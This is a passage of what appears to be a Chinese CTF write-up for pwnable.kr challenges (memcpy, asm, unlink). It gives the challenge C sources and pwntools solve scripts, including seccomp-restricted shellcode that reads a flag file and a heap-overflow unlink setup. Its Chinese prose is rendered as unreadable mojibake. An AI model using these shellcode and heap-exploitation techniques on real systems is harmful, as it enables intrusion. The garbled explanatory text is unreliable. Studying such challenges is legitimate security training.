operator">=</span><span class="token number">4</span><span class="token punctuation">;</span> e<span class="token operator">&lt;</span><span class="token number">14</span><span class="token punctuation">;</span> e<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 2^13 = 8K</span>        low <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>e<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        high <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"specify the memcpy amount between %d ~ %d : "</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> size <span class="token operator">&lt;</span> low <span class="token operator">||</span> size <span class="token operator">></span> high <span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"don't mess with the experiment.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        sizes<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> size<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ok, lets run the experiment with your configuration\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// run experiment</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        size <span class="token operator">=</span> sizes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"experiment %d : memcpy with buffer size %d\n"</span><span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        dest <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span> size <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">memcpy</span><span class="token punctuation">(</span>cache1<span class="token punctuation">,</span> cache2<span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// to eliminate cache effect</span>        t1 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">slow_memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// byte-to-byte memcpy</span>        t2 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ellapsed CPU cycles for slow_memcpy : %llu\n"</span><span class="token punctuation">,</span> t2<span class="token operator">-</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">memcpy</span><span class="token punctuation">(</span>cache1<span class="token punctuation">,</span> cache2<span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// to eliminate cache effect</span>        t1 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fast_memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// block-to-block memcpy</span>        t2 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ellapsed CPU cycles for fast_memcpy : %llu\n"</span><span class="token punctuation">,</span> t2<span class="token operator">-</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"thanks for helping my experiment!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flag : ----- erased in this source code -----\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-16"><a href="#ÂàÜÊûê-16" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><blockquote><p>ÊääÊ∫êÂ≠òÂÇ®Âô®ÂÜÖÂÆπÂÄºÈÄÅÂÖ•ÁõÆÁöÑÂØÑÂ≠òÂô®,ÂΩìÊúâm128Êó∂,ÂøÖÈ°ªÂØπÈΩêÂÜÖÂ≠ò16Â≠óËäÇ,‰πüÂ∞±ÊòØÂÜÖÂ≠òÂú∞ÂùÄ‰Ωé4‰Ωç‰∏∫0.</p><p>movntps m128,XMM<br>m128 &lt;== XMM Áõ¥Êé•ÊääXMM‰∏≠ÁöÑÂÄºÈÄÅÂÖ•m128Ôºå‰∏çÁªèËøácache,ÂøÖÈ°ªÂØπÈΩê16Â≠óËäÇ.</p></blockquote><p>Ê≥®ÊÑèÂà∞ÂΩì input &gt; 64 Êó∂Ôºå‰ºöË∞ÉÁî® fast_memcpy ‰∏ãÁöÑ movntps Êåá‰ª§ÔºåÊ≠§Êó∂ÂøÖÈ°ª‰øùËØÅÂú∞ÂùÄÂØπÈΩê</p><p>Âè¶Â§ñ malloc ÈÄöËøá edx ÂÄºËøîÂõûÂú∞ÂùÄÂÄº</p><p>ËÄÉËôëÂà∞ÂàÜÈÖç chunk Êó∂ÊúâÂõ∫ÂÆö headerÔºå32 ‰Ωç‰∏ãÈïøÂ∫¶‰∏∫ 0x8 (priv_size + size)ÔºåÊâÄ‰ª•ÊØèÊ¨°inputÊó∂ÔºåÊàë‰ª¨ÈÄöËøáÊéßÂà∂ padding ‰øùËØÅÊª°Ë∂≥‰∏ãÂàóÊù°‰ª∂‰πã‰∏ÄÔºö</p><ul><li>(input + padding + len(header)) % 0x10 &gt; 0x8 ËøôÁßçÊÉÖÂÜµ‰ºöËá™Âä®ÂØπÈΩêËá≥ 0x10</li><li>(input + padding + len(header)) % 0x10 = 0x0</li></ul><p>Êé®ËçêÔºö<a href="https://www.cnblogs.com/wangaohui/p/5190889.html" target="_blank" rel="noopener">MallocÁ¢éÁ¢éÂøµ</a></p><p><strong>ËøôÈáåÊ∑ªÂä†‰∏Ä‰∏ãÂØπÈΩêÂâçÂêéÁöÑÂ†ÜÂÜÖÂÆπÁöÑÂØπÊØîÂõæÁâá</strong></p><h3 id="Ëß£È¢ò-16"><a href="#Ëß£È¢ò-16" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>chunk_header <span class="token operator">=</span> <span class="token number">0x8</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> <span class="token number">9022</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    n <span class="token operator">=</span> <span class="token number">8</span> <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token number">2</span><span class="token operator">**</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> chunk_header    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[->] %d"</span> <span class="token operator">%</span> n<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"experiment!\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="18-asm"><a href="#18-asm" class="headerlink" title="18. asm"></a>18. asm</h2><h3 id="È¢òÁõÆ-17"><a href="#È¢òÁõÆ-17" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;seccomp.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/prctl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> LENGTH 128</span><span class="token keyword">void</span> <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    scmp_filter_ctx ctx <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span>SCMP_ACT_KILL<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ctx <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"seccomp error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>open<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>read<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>write<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>exit<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>exit_group<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">seccomp_load</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">seccomp_release</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"seccomp error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">seccomp_release</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span> stub<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff"</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> filter<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IOLBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to shellcoding practice challenge.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"If this does not challenge you. you should play 'asg' challenge :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> sh <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0x41414000</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_ANONYMOUS <span class="token operator">|</span> MAP_FIXED <span class="token operator">|</span> MAP_PRIVATE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>sh<span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>sh<span class="token punctuation">,</span> stub<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>stub<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> offset <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>stub<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"give me your x64 shellcode: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> sh<span class="token operator">+</span>offset<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chroot</span><span class="token punctuation">(</span><span class="token string">"/home/asm_pwn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// you are in chroot jail. so you can't use symlink in /tmp</span>    <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-17"><a href="#ÂàÜÊûê-17" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>ËøôÈÅìÈ¢ò‰∏ªË¶ÅÊ∂âÂèä<a href="https://en.wikipedia.org/wiki/Seccomp" target="_blank" rel="noopener">seccomp</a></p><blockquote><p>seccomp (short for secure computing mode) is a computer security facility in the Linux kernel. seccomp allows a process to make a one-way transition into a ‚Äúsecure‚Äù state where it cannot make any system calls except exit(), sigreturn(), read() and write() to already-open file descriptors. Should it attempt any other system calls, the kernel will terminate the process with SIGKILL or SIGSYS. In this sense, it does not virtualize the system‚Äôs resources but isolates the process from them entirely.</p></blockquote><p>ÈÄöËøáÊ≠§ÁâπÊÄßÂàùÂßãÂåñSCMP_ACT_KILLÈôêÂà∂‰∫ÜÊâÄÊúâ syscallÔºåÂêéÊ∑ªÂä†ËßÑÂàôÂÖÅËÆ∏‰ΩøÁî®ÁöÑ‰ªÖ‰∏∫ open read write exit exit_group</p><p>Êàë‰ª¨ÈúÄË¶ÅÂÅöÁöÑ‰æøÊòØÔºö</p><ol><li>ÊâìÂºÄ(open) flag Êñá‰ª∂</li><li>ËØªÂèñ(read) flag Êñá‰ª∂</li><li>ÂÜô(write) Êñá‰ª∂ÂÜÖÂÆπÂÜôÂà∞Ê†áÂáÜËæìÂá∫(stdout)</li></ol><p>ÂØπÂÖ•Èó®‰∏ç‰ºöÁîüÊàê shellcode ÁöÑÊàëÔºåpwnlib Êèê‰æõ‰∫Ü shellcraftÔºå<strong>Ê≥®ÊÑèÂèëÈÄÅÊó∂ÈúÄË¶ÅË∞ÉÁî® asm ÊñπÊ≥ïÁºñËØëÊ±áÁºñÁ†Å</strong></p><hr><ul><li><a href="https://www.man7.org/linux/man-pages/man2/syscall.2.html" target="_blank" rel="noopener">Linux Programmer‚Äôs Manual </a></li><li><a href="https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux" target="_blank" rel="noopener">X86 Assembly/Interfacing with Linux</a></li></ul><p>‰ªé‰∏äÈù¢ÁöÑËµÑÊñôÂèØÁü•Êñá‰ª∂Âè•ÊüÑÊòØÈÄöËøá rax ËøîÂõûÁöÑÔºåÊâÄ‰ª•Êàë‰ª¨Áõ¥Êé•‰ªé rax ËØªÂèñÊñá‰ª∂Âç≥ÂèØÔºå‰ΩÜÂÆûÈôÖ‰∏älinuxÊñá‰ª∂Âè•ÊüÑ(fd)ÊòØ‰ªé 3 ÂºÄÂßãÂ¢ûÈïøÁöÑÔºåÂõ†‰∏∫Êàë‰ª¨Á¨¨‰∏Ä‰∏™‰πüÂè™ÊâìÂºÄ‰∏Ä‰∏™ÔºåÊâÄ‰ª•ÂøÖÂÆöÊòØ 3</p><h3 id="Ëß£È¢ò-17"><a href="#Ëß£È¢ò-17" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'DEBUG'</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> <span class="token number">9026</span><span class="token punctuation">)</span>sc <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># sc += shellcraft.read("rax", "rsp", 100)</span>sc <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"rsp"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>sc <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"rsp"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>sc<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="19-unlink"><a href="#19-unlink" class="headerlink" title="19. unlink"></a>19. unlink</h2><h3 id="È¢òÁõÆ-18"><a href="#È¢òÁõÆ-18" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> tagOBJ<span class="token punctuation">{</span>    <span class="token keyword">struct</span> tagOBJ<span class="token operator">*</span> fd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> tagOBJ<span class="token operator">*</span> bk<span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>OBJ<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">unlink</span><span class="token punctuation">(</span>OBJ<span class="token operator">*</span> P<span class="token punctuation">)</span><span class="token punctuation">{</span>    OBJ<span class="token operator">*</span> BK<span class="token punctuation">;</span>    OBJ<span class="token operator">*</span> FD<span class="token punctuation">;</span>    BK<span class="token operator">=</span>P<span class="token operator">-></span>bk<span class="token punctuation">;</span>    FD<span class="token operator">=</span>P<span class="token operator">-></span>fd<span class="token punctuation">;</span>    FD<span class="token operator">-></span>bk<span class="token operator">=</span>BK<span class="token punctuation">;</span>    BK<span class="token operator">-></span>fd<span class="token operator">=</span>FD<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    OBJ<span class="token operator">*</span> A <span class="token operator">=</span> <span class="token punctuation">(</span>OBJ<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>OBJ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    OBJ<span class="token operator">*</span> B <span class="token operator">=</span> <span class="token punctuation">(</span>OBJ<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>OBJ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    OBJ<span class="token operator">*</span> C <span class="token operator">=</span> <span class="token punctuation">(</span>OBJ<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>OBJ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// double linked list: A &lt;-> B &lt;-> C</span>    A<span class="token operator">-></span>fd <span class="token operator">=</span> B<span class="token punctuation">;</span>    B<span class="token operator">-></span>bk <span class="token operator">=</span> A<span class="token punctuation">;</span>    B<span class="token operator">-></span>fd <span class="token operator">=</span> C<span class="token punctuation">;</span>    C<span class="token operator">-></span>bk <span class="token operator">=</span> B<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"here is stack address leak: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>A<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"here is heap address leak: %p\n"</span><span class="token punctuation">,</span> A<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"now that you have leaks, get shell!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// heap overflow!</span>    <span class="token function">gets</span><span class="token punctuation">(</span>A<span class="token operator">-></span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// exploit this unlink!</span>    <span class="token function">unlink</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-18"><a href="#ÂàÜÊûê-18" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>È¶ñÂÖàÂÖàÁúã‰∫Ü double-free ÁöÑÂà©Áî®ÔºåÂç≥ unlink ÁöÑ‰∏ÄÁßçÂà©Áî®ÊòØÈÄöËøáÂä´ÊåÅGOTË°®ÂÆûÁé∞ÂëΩ‰ª§ÊâßË°åÔºå‰ΩÜÊòØÈ¢òÁõÆ‰∏≠ Unlink ÂêéÊ≤°ÊúâË∑üÂÖ∂‰ªñÂáΩÊï∞ÁöÑÔºåÊâÄ‰ª•Êó†Ê≥ïÂà©Áî®</p><p>ÈÇ£‰πàËÉΩÂê¶Áõ¥Êé•ÊìçÊéß main ËøîÂõûÂú∞ÂùÄÊù•ÂÆûÁé∞Ë∑≥ËΩ¨Âà∞ shellcode ÊâßË°åÂë¢ÔºüÁúã‰∏ã main ÊúÄÂêéÁöÑÊ±áÁºñÊòØÊÄé‰πàÂÜôÁöÑ</p><pre class=" language-armasm"><code class="language-armasm">0x080485ff <+208>:    mov    ecx,DWORD PTR [ebp-0x4]0x08048602 <+211>:    leave  0x08048603 <+212>:    lea    esp,[ecx-0x4]0x08048606 <+215>:    ret </code></pre><p>ÁøªËØëËøáÊù•</p><pre class=" language-armsam"><code class="language-armsam">mov    ecx,[ebp-0x4]mov    esp,ebppop    ebplea    esp,[ecx-0x4]ret</code></pre><p>Ê≠§Êó∂Ê†àÂÜÖÂàÜÂ∏É</p><p><img 